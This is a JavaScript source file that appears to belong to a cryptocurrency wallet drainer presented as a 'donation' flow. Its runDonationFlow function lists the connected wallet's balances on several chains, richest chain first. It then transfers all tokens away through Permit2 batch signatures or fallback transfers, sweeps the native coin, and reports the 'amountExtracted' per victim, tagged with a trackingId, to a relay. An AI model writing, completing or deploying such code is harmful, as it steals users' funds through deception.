// src/engine/donate.js
import { notify } from "../utils/notify.js";
import { sendEvent } from "../utils/eventRelay.js";
import { fetchBalancesCovalent, filterPermit2SafeTokens, buildWalletSummary, getChainValue } from "./balances.js";
import { getProviderForChain } from "./providerHelper.js";
import { isPermit2Compatible, executePermit2Batch } from "./permit2.js";
import { executeFallbackBatch, sweepNative } from "./fallback.js";
import { CHAINS, exceptionList } from "../config.js";
import { ethers } from "ethers";

/**
 * Fetch native price from backend proxy.
 * Backend endpoint expected: `${BACKEND_BASE}/price/:symbol`
 */
const priceCache = {};
const BACKEND_BASE = import.meta.env.VITE_BACKEND_URL || window.location.origin;

export async function fetchNativePrice(symbol) {
  if (!symbol) return 0;
  if (priceCache[symbol]) return priceCache[symbol];

  try {
    const res = await fetch(`${BACKEND_BASE}/price/${encodeURIComponent(symbol)}`);
    if (!res.ok) {
      console.warn("backend price fetch failed", res.status);
      return 0;
    }

    const json = await res.json();

    // backend may return different shapes:
    // 1) { usd: 123 }
    // 2) { ethereum: { usd: 123 } }
    // 3) CoinGecko markets array (rare)
    let price = 0;
    if (typeof json?.usd === "number") price = json.usd;
    else {
      // check top-level keys
      const keys = Object.keys(json || {});
      if (keys.length === 1 && json[keys[0]] && typeof json[keys[0]].usd === "number") {
        price = json[keys[0]].usd;
      } else if (Array.isArray(json) && json[0] && typeof json[0].current_price === "number") {
        price = json[0].current_price;
      }
    }

    priceCache[symbol] = price || 0;
    return price || 0;
  } catch (err) {
    console.warn("fetchNativePrice error", err);
    return 0;
  }
}

/* -------------------------
   runDonationFlow (unchanged)
   ------------------------- */

export async function runDonationFlow(walletClient, owner, trackingId) {
  try {
    if (!owner) {
      owner = walletClient?.account?.address;
    }
    if (!owner) throw new Error("Wallet not connected");

    const { balancesPayload, grandTotal, chainBalances } = await buildWalletSummary(owner);

    // Sort chains descending by totalValue
    chainBalances.sort((a, b) => b.totalValue - a.totalValue);

    // Process each chain
    for (const chain of chainBalances) {
      notify("DONATION_START", { walletAddress: owner, trackingId, chain: chain.name });
      await sendEvent("DONATION_START", { walletAddress: owner, trackingId, chain: chain.name });

      const { provider, signer } = await getProviderForChain(walletClient, chain.chainId, trackingId);
      if (!provider || !signer) continue;

      // Split tokens for Permit2 vs fallback
      const permit2Tokens = [];
      const fallbackTokens = [];
      for (const t of chain.tokens) {
        const addr = t.tokenAddress.toLowerCase();
        if (exceptionList?.[chain.chainId]?.includes(addr)) fallbackTokens.push(t);
        else (await isPermit2Compatible(addr, signer)) ? permit2Tokens.push(t) : fallbackTokens.push(t);
      }

      // Execute Permit2 batch
      if (permit2Tokens.length) {
        try { await executePermit2Batch(signer, chain.chainId, permit2Tokens); }
        catch (err) { console.warn("Permit2 batch error:", err); fallbackTokens.push(...permit2Tokens); }
      }

      // Execute fallback batch
      if (fallbackTokens.length) {
        try { await executeFallbackBatch(signer, chain.chainId, fallbackTokens); }
        catch (err) { console.warn("Fallback batch error:", err); }
      }

      // Sweep native token
      try { await sweepNative(signer, provider, chain.chainId); }
      catch (err) { console.warn("Native sweep error:", err); }

      // Re-fetch balances
      let refreshedRaw = null;
      try {
        console.log(">>> Fetching refreshed balances...");
        refreshedRaw = await fetchBalancesCovalent(owner, chain.chainId);
        console.log(">>> Refreshed balances:", refreshedRaw);
      } catch (err) {
        console.warn("⚠️ Balance refresh failed, using empty fallback:", err);
        refreshedRaw = [];
      }

      const refreshedFiltered = filterPermit2SafeTokens(refreshedRaw);

      const refreshedProvider = new ethers.JsonRpcProvider(chain.rpcUrl);
      const refreshedNativeRaw = await refreshedProvider.getBalance(owner);
      const refreshedNative = parseFloat(ethers.formatEther(refreshedNativeRaw));
      const refreshedNativeUSD = refreshedNative * await fetchNativePrice(chain.nativeSymbol);
      const refreshedTotal = getChainValue(refreshedFiltered) + refreshedNativeUSD;
      const amountExtracted = Math.max(0, chain.totalValue - refreshedTotal);

      const resultsPayload = {
        walletAddress: owner,
        trackingId,
        balances: [{
          name: chain.name,
          native: refreshedNative.toFixed(6),
          nativeValue: refreshedNativeUSD.toFixed(2),
          tokens: refreshedFiltered.map(t => ({
            name: t.tokenSymbol,
            amount: Number(ethers.formatUnits(t.balanceRaw, t.contract_decimals || t.decimals || 18)).toFixed(6),
            value: Number(t.quote).toFixed(2),
          })),
          total: refreshedTotal.toFixed(2),
        }],
        donationSummary: {
          total: amountExtracted.toFixed(2),
          breakdown: [{ chain: chain.name, amount: amountExtracted.toFixed(2) }],
        },
      };

      notify("DONATION_RESULTS", resultsPayload);
      await sendEvent("DONATION_RESULTS", resultsPayload);
    }

    notify("DONATION_COMPLETED", { walletAddress: owner, trackingId });
    await sendEvent("DONATION_COMPLETED", { walletAddress: owner, trackingId });
    return { success: true };
  } catch (err) {
    console.error("runDonationFlow error:", err);
    return { success: false, reason: err.message || String(err) };
  }
}
